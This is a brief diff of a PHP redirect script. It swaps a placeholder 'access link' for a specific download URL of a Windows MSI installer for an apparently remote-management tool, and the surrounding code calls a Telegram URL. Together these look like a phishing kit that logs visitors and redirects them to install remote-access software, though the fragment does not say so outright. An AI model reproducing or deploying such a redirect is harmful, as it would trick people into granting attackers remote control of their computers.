@@ -32,7 +32,7 @@ file_get_contents($telegramURL);
 <?php
 // Array of URLs to redirect to
 $redirectUrls = [
-    "access link"
+    "https://downloads.lunixar.com/Installers/Windows/1.6.46/bfc726ca0e704192962a8486e11e35f0/LunixarRMM.msi"
     // Add more links as needed
 ];
 
